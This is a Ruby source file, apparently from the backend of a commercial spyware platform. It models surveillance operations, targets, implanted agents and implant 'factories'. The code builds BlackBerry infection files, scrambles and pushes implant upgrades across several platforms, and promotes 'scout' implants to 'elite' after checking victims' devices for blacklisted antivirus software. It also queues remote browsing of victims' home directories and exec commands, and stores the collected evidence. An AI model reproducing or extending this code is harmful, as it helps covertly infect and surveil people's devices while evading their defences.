# encoding: utf-8

require 'mongoid'

require_relative '../build'
require_relative '../push'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'

class Item
  extend RCS::Tracer
  include RCS::Tracer
  include RCS::Crypt
  include Mongoid::Document
  include Mongoid::Timestamps

  # common
  field :name, type: String
  field :desc, type: String
  field :status, type: String
  field :_kind, type: String
  field :path, type: Array

  # operation
  field :contact, type: String

  # factory
  field :ident, type: String
  field :counter, type: Integer
  field :seed, type: String
  field :confkey, type: String
  field :logkey, type: String

  # agent instance (+ factory fields)
  field :instance, type: String
  field :version, type: Integer
  field :type, type: String
  field :platform, type: String
  field :deleted, type: Boolean, default: false
  field :uninstalled, type: Boolean
  field :demo, type: Boolean, default: false
  field :scout, type: Boolean, default: false
  field :upgradable, type: Boolean
  field :purge, type: Array, default: [0, 0]

  field :cs, type: String
  
  scope :operations, where(_kind: 'operation')
  scope :targets, where(_kind: 'target')
  scope :agents, where(_kind: 'agent')
  scope :factories, where(_kind: 'factory')

  has_and_belongs_to_many :groups, :dependent => :nullify, :autosave => true

  embeds_many :filesystem_requests, class_name: "FilesystemRequest"
  embeds_many :download_requests, class_name: "DownloadRequest"
  embeds_many :upgrade_requests, class_name: "UpgradeRequest"
  embeds_many :upload_requests, class_name: "UploadRequest"
  embeds_many :exec_requests, class_name: "ExecRequest"

  embeds_one :stat

  embeds_many :configs, class_name: "Configuration"

  index :name
  index :status
  index :_kind
  index :ident
  index :instance

  store_in :items

  after_create :create_callback
  before_destroy :destroy_callback

  after_update :status_change_callback
  after_update :notify_callback

  before_create :do_checksum
  before_update :do_checksum
  before_save :do_checksum
  
  public

  def self.reset_dashboard
    Item.any_in(_kind: ['agent', 'target']).each {|i| i.reset_dashboard}
  end

  def reset_dashboard
    self.stat.dashboard = {}
    self.save
  end

  # performs global recalculation of stats (to be called periodically)
  def self.restat
    begin
      t = Time.now
      # to make stat converge in one step, first restat agent, targets, then operations
      #Item.where(_kind: 'agent').each {|i| i.restat}
      Item.where(_kind: 'target').each {|i| i.restat}
      Item.where(_kind: 'operation').each {|i| i.restat}
      trace :debug, "Restat time: #{Time.now - t}" if RCS::DB::Config.instance.global['PERF']
    rescue Exception => e
      trace :fatal, "Cannot restat items: #{e.message}"
    end
  end
  
  def restat
    case self._kind
      when 'operation'
        self.stat.size = 0
        self.stat.grid_size = 0
        targets = Item.where(_kind: 'target').also_in(path: [self._id]).only(:stat)
        targets.each do |t|
          self.stat.size += t.stat.size
          self.stat.grid_size += t.stat.grid_size
          if (not t.stat.last_sync.nil?) and (self.stat.last_sync.nil? or t.stat.last_sync > self.stat.last_sync)
            self.stat.last_sync = t.stat.last_sync
          end
        end
        self.save
      when 'target'
        self.stat.evidence = {}
        self.stat.dashboard = {}
        agents = Item.where(_kind: 'agent', deleted: false).also_in(path: [self._id]).only(:stat)
        agents.each do |a|
          self.stat.evidence.merge!(a.stat.evidence) {|k,o,n| o+n }
          self.stat.dashboard.merge!(a.stat.dashboard) {|k,o,n| o+n }
          if (not a.stat.last_sync.nil?) and (self.stat.last_sync.nil? or a.stat.last_sync > self.stat.last_sync)
            self.stat.last_sync = a.stat.last_sync
          end
        end
        db = Mongoid.database
        # evidence size
        collection = db.collection('evidence.' + self._id.to_s)
        self.stat.size = collection.stats['size'].to_i
        # grid size
        begin
          collection = db.collection('grid.' + self._id.to_s + '.files')
          self.stat.grid_size = collection.stats['size'].to_i
          collection = db.collection('grid.' + self._id.to_s + '.chunks')
          self.stat.grid_size += collection.stats['size'].to_i
        rescue Mongo::OperationFailure
          # the grid collection is not present
          self.stat.grid_size = 0
        end
        self.save
      when 'agent'
        self.stat.evidence = {}
        ::Evidence::TYPES.each do |type|
          query = {type: type, aid: self._id}
          self.stat.evidence[type] = Evidence.collection_class(self.get_parent[:_id]).where(query).count
        end
        self.save
    end
  end

  def get_parent
    ::Item.find(self.path.last)
  end

  def clone_instance
    return nil if self[:_kind] != 'factory'

    agent = Item.new
    agent._kind = 'agent'
    agent.deleted = false
    agent.ident = self[:ident]
    agent.name = self[:name] + " (#{self[:counter]})"
    agent.type = self[:type]
    agent.desc = self[:desc]
    agent[:path] = self[:path]
    agent.confkey = self[:confkey]
    agent.logkey = self[:logkey]
    agent.seed = self[:seed]

    # clone the factory's config
    if self[:configs].first
      fc = self[:configs].first

      nc = ::Configuration.new
      nc.user = fc['user']
      nc.desc = fc['desc']
      nc.config = fc['config']
      nc.saved = Time.now.getutc.to_i

      agent.configs = [ nc ]
    end

    ns = ::Stat.new
    ns.evidence = {}
    ns.dashboard = {}
    ns.size = 0
    ns.grid_size = 0

    agent.stat = ns

    return agent
  end

  def add_infection_files
    config = JSON.parse(self.configs.last.config)

    found = false

    # build the infection files only if at least one subaction is dealing with the infection module
    config['actions'].each do |action|
      action['subactions'].each do |sub|
        if sub['action'] == 'module' and sub['module'] == 'infection'
          found = true
        end
      end
    end

    if found
      trace :info, "Infection module for agent #{self.name} detected, building files..."
    else
      return
    end

    begin
      config['modules'].each do |mod|
        if mod['module'] == 'infection'

=begin
          if mod['usb'] or mod['vm'] > 0
            factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
            build = RCS::DB::Build.factory(:windows)
            build.load({'_id' => factory._id})
            build.unpack
            build.patch({'demo' => self.demo})
            build.scramble
            build.melt({'admin' => false, 'demo' => self.demo})
            add_upgrade('installer', File.join(build.tmpdir, 'output'))
            build.clean
          end
=end

          if mod['mobile']
            factory = ::Item.where({_kind: 'factory', ident: mod['factory']}).first

=begin
            build = RCS::DB::Build.factory(:winmo)
            build.load({'_id' => factory._id})
            build.unpack
            build.patch({'demo' => self.demo})
            build.scramble
            build.melt({'admin' => false, 'demo' => self.demo})
            add_upgrade('wmcore.001', File.join(build.tmpdir, 'autorun.exe'))
            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))                       
            build.clean

=end
            build = RCS::DB::Build.factory(:blackberry)
            build.load({'_id' => factory._id})
            build.unpack
            build.patch({'demo' => self.demo})
            build.scramble
            build.melt({'appname' => 'bb_in'})
            build.infection_files('bb_in').each do |f|
              trace :debug, " BlackBerry adding: #{f}"
              add_upgrade(f[:name], f[:path])
            end
            build.clean
          end

        end
      end
    rescue Exception => e
      trace :error, "Cannot create infection file: #{e.message}"
    end

  end

  def add_first_time_uploads
    return if self[:_kind] != 'agent'

    if self.platform == 'windows'
      factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
      build = RCS::DB::Build.factory(:windows)
      build.load({'_id' => factory._id})
      build.unpack
      build.patch({'demo' => self.demo})

      # copy the files in the upgrade collection
      add_upgrade('sqlite', File.join(build.tmpdir, 'sqlite'))

      build.clean
    end

  end

  def add_upgrade(name, file)
    # make sure to overwrite the new upgrade
    self.upgrade_requests.destroy_all(conditions: { filename: name })

    content = File.open(file, 'rb+') {|f| f.read}
    raise "Cannot read from file #{file}" if content.nil?

    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'})] })
  end

  def upgrade!
    return if self.version.nil?

    # delete any pending upgrade if requested multiple time
    self.upgrade_requests.destroy_all if self.upgradable

    if self.scout
      # check the presence of blacklisted AV in the device evidence
      blacklisted_software?

      # if it's a scout, there a special procedure
      return upgrade_scout
    end

    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
    build = RCS::DB::Build.factory(self.platform.to_sym)
    build.load({'_id' => factory._id})
    build.unpack
    build.patch({'demo' => self.demo})

    # then for each platform we have differences
    case self.platform
      when 'windows'
        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
        # TODO: driver removal
        #add_upgrade('driver', File.join(build.tmpdir, 'driver'))
        #add_upgrade('driver64', File.join(build.tmpdir, 'driver64'))
      when 'osx'
        add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
        add_upgrade('driver', File.join(build.tmpdir, 'driver'))
      when 'ios'
        add_upgrade('dylib', File.join(build.tmpdir, 'dylib'))
      when 'winmo'
        add_upgrade('smsfilter', File.join(build.tmpdir, 'smsfilter'))
      when 'blackberry'
       	add_upgrade('core-1_4.5', File.join(build.tmpdir, 'net_rim_bb_lib-1_4.5.cod'))
        add_upgrade('core-0_4.5', File.join(build.tmpdir, 'net_rim_bb_lib_4.5.cod'))
        if self.version >= 2012063001
          add_upgrade('core-1_5.0', File.join(build.tmpdir, 'net_rim_bb_lib-1_5.0.cod'))
          add_upgrade('core-0_5.0', File.join(build.tmpdir, 'net_rim_bb_lib_5.0.cod'))
		    end
    end

    # always upgrade the core
    add_upgrade('core', File.join(build.tmpdir, 'core')) if File.exist? File.join(build.tmpdir, 'core')

    build.clean

    self.upgradable = true
    self.save
  end

  def upgrade_scout
    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
    build = RCS::DB::Build.factory(self.platform.to_sym)
    build.load({'_id' => factory._id})
    build.unpack
    build.patch({'demo' => self.demo})
    build.scramble
    build.melt({'bit64' => true, 'codec' => true, 'scout' => false})

    add_upgrade('elite', File.join(build.tmpdir, 'output'))

    build.clean

    self.upgradable = true
    self.save
  end

  def add_default_filesystem_requests
    return if self[:_kind] != 'agent'

    # the request for the root
    self.filesystem_requests.create!({path: '/', depth: 1})

    # special request for windows to have the c: drive
    self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'

    # the home for the current user
    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
  end

  def create_callback
    case self._kind
      when 'target'
        self.create_evidence_collections
        # also create the relative entity
        Entity.create! do |entity|
          entity.type = :target
          entity.level = :automatic
          entity.path = self.path + [self._id]
          entity.name = self.name
          entity.desc = self.desc
        end
    end

    RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'create'})
  end

  def notify_callback
    # we are only interested if the properties changed are:
    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'scout']
    return if not interesting.collect {|k| changes.include? k}.inject(:|)

    RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'modify'})
  end

  def destroy_callback
    # remove the item form any dashboard or recent
    ::User.all.each {|u| u.delete_item(self._id)}
    # remove the item form the alerts
    ::Alert.all.each {|a| a.delete_if_item(self._id)}
    # remove the NIA rules that contains the item
    ::Injector.all.each {|p| p.delete_rule_by_item(self._id)}
    # remove the connector rules that contains the item
    ::Connector.all.each {|p| p.delete_if_item(self._id)}
    # remove backups for operations or targets
    ::Backup.all.each {|b| b.delete_if_item(self._id)}

    case self._kind
      when 'operation'
        # destroy all the targets of this operation
        Item.where({_kind: 'target', path: [ self._id ]}).each {|targ| targ.destroy}
        # destroy the entities related to this operation
        Entity.where({path: [ self._id ]}).each { |entity| entity.destroy }
      when 'target'
        # destroy all the agents of this target
        # to speed up the process, set the DROPPING flag.
        # during callbacks the agent will not delete the evidence
        Item.any_in({_kind: ['factory', 'agent']}).also_in({path: [ self._id ]}).each do |agent|
          agent[:dropping] = true
          agent.save
          agent.destroy
        end
        # destroy the entities related to this target
        Entity.any_in({path: [ self._id ]}).each { |entity| entity.destroy }
        trace :info, "Dropping evidence for target #{self.name}"
        # drop evidence and aggregates
        self.drop_evidence_collections
        Aggregate.collection_class(self._id.to_s).collection.drop
      when 'agent'
        # dropping flag is set only by cascading from target
        unless self[:dropping]
          trace :info, "Deleting evidence for agent #{self.name}..."
          Evidence.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
          trace :info, "Deleting evidence for agent #{self.name} done."
        end
      when 'factory'
        # delete all the pushed documents of this factory
        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
    end

    RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'destroy'})
  rescue Exception => e
    trace :error, "ERROR: #{e.message}"
    trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
    raise
  end

  def drop_evidence_collections
    return if self._kind != 'target'

    # drop the evidence collection of this target
    Evidence.collection_class(self._id.to_s).collection.drop
    RCS::DB::GridFS.drop_collection(self._id.to_s)
  end

  def create_evidence_collections
    return if self._kind != 'target'

    # create the collection for the target's evidence and shard it
    db = Mongoid.database
    collection = db.collection(Evidence.collection_name(self._id))
    # ensure indexes
    Evidence.collection_class(self._id).create_indexes
    # enable sharding only if not enabled
    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
  end

  def blacklisted_software?
    raise "Cannot determine blacklist" if self._kind != 'agent'

    device = Evidence.collection_class(self.path.last).where({type: 'device', aid: self._id.to_s}).last
    raise "Cannot determine installed software" unless device

    installed = device[:data]['content']

    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
      offending.chomp!
      next unless offending
      bver, bmatch = offending.split('|')
      bver = bver.to_i
      trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
      if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
        trace :warn, "Blacklisted software detected: #{bmatch}"
        raise "The target device contains a software that prevents the upgrade."
      end
    end
  end

  def self.offload_destroy(params)
    item = ::Item.find(params[:id])
    item.destroy
  rescue Exception => e
    trace :error, "Offload destroy: #{e.message}"
  end

  def self.offload_destroy_callback(params)
    item = ::Item.find(params[:id])
    item.destroy_callback
  rescue Exception => e
    trace :error, "Offload destroy: #{e.message}"
  end

  def status_change_callback
    return if self.status == 'open'

    # cascade the closed status to all the descendants
    case self._kind
      when 'operation'
        Item.where({_kind: 'target', path: [ self._id ]}).each do |target|
          target.status = 'closed'
          target.save
        end
      when 'target'
        Item.any_in({_kind: ['agent', 'factory']}).also_in({path: [ self._id ]}).each do |agent|
          agent.status = 'closed'
          agent.save
        end
      when 'factory'
        # delete all the pushed documents of this factory
        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
    end
  end

  def do_checksum
    self.cs = calculate_checksum
  end

  def calculate_checksum
    # take the fields that are relevant and calculate the checksum on it
    hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]

    if self._kind == 'agent'
      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable]
    end

    aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
  end

end

class FilesystemRequest
  include Mongoid::Document
  
  field :path, type: String
  field :depth, type: Integer
  
  validates_uniqueness_of :path

  embedded_in :item
end

class DownloadRequest
  include Mongoid::Document

  field :path, type: String

  validates_uniqueness_of :path

  embedded_in :item
end

class UpgradeRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array

  validates_uniqueness_of :filename

  embedded_in :item

  after_destroy :destroy_upgrade_callback

  def destroy_upgrade_callback
    # remove the content from the grid
    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
  end

end

class UploadRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :sent, type: Integer, :default => 0
  field :_grid, type: Array
  field :_grid_size, type: Integer

  embedded_in :item

  after_destroy :destroy_upload_callback

  def destroy_upload_callback
    # remove the content from the grid
    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
  end
end

class ExecRequest
  include Mongoid::Document

  field :command, type: String

  embedded_in :item
end

class Stat
  include Mongoid::Document

  field :source, type: String
  field :user, type: String
  field :device, type: String
  field :last_sync, type: Integer
  field :last_sync_status, type: Integer
  field :last_child, type: Array
  field :size, type: Integer, :default => 0
  field :ghost, type: Boolean, :default => false
  field :grid_size, type: Integer, :default => 0
  field :evidence, type: Hash, :default => {}
  field :dashboard, type: Hash, :default => {}
  
  embedded_in :item
end
